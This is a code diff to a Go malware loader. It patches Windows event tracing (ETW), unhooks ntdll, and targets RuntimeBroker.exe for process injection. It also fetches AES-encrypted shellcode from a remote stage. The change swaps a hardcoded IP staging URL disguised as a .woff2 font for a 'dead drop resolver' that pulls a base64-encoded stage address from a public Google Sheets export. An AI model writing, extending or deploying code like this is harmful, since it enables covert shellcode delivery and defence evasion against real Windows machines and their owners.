@@ -3,11 +3,13 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
+	"strings"
 	"time"
 	"unsafe"
 
@@ -19,7 +21,7 @@ var (
 	// AES key  decrypt shellcode ( encrypt)
 	aesKeyHex = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
 
-	stageURL   = "http://100.103.4.93:9999/update.woff2"
+	dropURL  = "https://docs.google.com/spreadsheets/d/1iL2KUReRRefw60Xm5GwAASvjuNT_ttTCvLSSPdaeQg8/export?format=csv&range=A1"
 	targetProc = `C:\Windows\System32\RuntimeBroker.exe`
 )
 
@@ -29,6 +31,11 @@ func main() {
 	patchETW()
 	patchETWAdditional()
 	unhookNtdll()
+
+	stageURL, err := resolveDropURL(dropURL)
+	if err != nil {
+		os.Exit(1)
+	}
 
 	shellcode, err := fetchAndDecrypt(stageURL)
 	if err != nil {
@@ -74,6 +81,28 @@ func xorEncode(plaintext string, key string) []byte {
 		result[i] = data[i] ^ key[i%len(key)]
 	}
 	return result
+}
+
+// --- Dead Drop Resolver (Google Sheets) ---
+func resolveDropURL(dropURL string) (string, error) {
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(dropURL)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	decoded, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
+	if err != nil {
+		return "", err
+	}
+
+	return strings.TrimSpace(string(decoded)), nil
 }
 
 // --- Fetch + Decrypt Shellcode ---
